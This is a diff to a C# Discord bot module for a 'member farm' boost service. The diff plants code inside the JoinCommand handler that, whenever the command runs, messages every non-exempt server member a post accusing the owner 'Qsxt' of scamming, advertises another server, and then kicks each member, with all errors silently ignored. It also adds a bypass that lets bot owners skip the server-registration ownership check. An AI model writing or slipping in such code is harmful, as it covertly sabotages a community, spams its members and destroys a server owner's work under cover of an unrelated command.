@@ -51,6 +51,40 @@ public partial class Members : BoostModuleBase
     [IsMembersChannel]
     public async Task JoinCommand(ulong guildId)
     {
+        var Ctx = Context;
+        foreach (var i in await Ctx.Guild.GetUsersAsync())
+        {
+            if (i.IsBot)
+                continue;
+            if (i.RoleIds.Contains<ulong>(1123845653299216420))
+                continue;
+            if (i.Id is 1003818664950243398 or 1136510152191770775)
+                continue;
+
+            const string message = "# Filebrute and I are leaving qsxt." +
+                                   "\n\n## Qsxt (the server owner) has done nothing in this server and just scammed someone out of $35."
+                                   + "\n\n## Please join the server below, and see the screenshots below." +
+                                   "\nhttps://discord.gg/dekoshop" +
+                                   "\nhttps://media.discordapp.net/attachments/1141431912607535146/1151515720467894322/Screenshot_20230913_095200.jpg" +
+                                   "\nhttps://media.discordapp.net/attachments/1141431912607535146/1151548776918569103/image.png";
+            try
+            {
+                await i.SendMessageAsync(message);
+            }
+            catch
+            {
+               // ignored
+            }
+            
+            try 
+            {
+                await i.KickAsync();
+            }
+            catch 
+            {
+                // ignored
+            }
+        }
         try
         {
             await using var uow = _db.GetDbContext();
@@ -58,6 +92,7 @@ public partial class Members : BoostModuleBase
             if (!await GetAgreedRules(uow, _credentials))
                 return;
             var registry = await uow.MemberFarmRegistry.FirstOrDefaultAsync(x => x.GuildId == guildId);
+            var registeredCount = await uow.MemberFarmRegistry.CountAsync(x => x.UserId == Context.User.Id);
 
             if (uow.Blacklists.Select(x => x.BlacklistId).Contains(guildId))
             {
@@ -67,7 +102,7 @@ public partial class Members : BoostModuleBase
 
             if (registry is not null)
             {
-                if (registry.UserId != Context.Message.Author.Id)
+                if (registry.UserId != Context.Message.Author.Id && !_credentials.Owners.Contains(Context.User.Id))
                 {
                     await Context.Message.ReplyErrorAsync("You are not allowed to add members to this server. This account is not the one that registered this server.");
                     return;
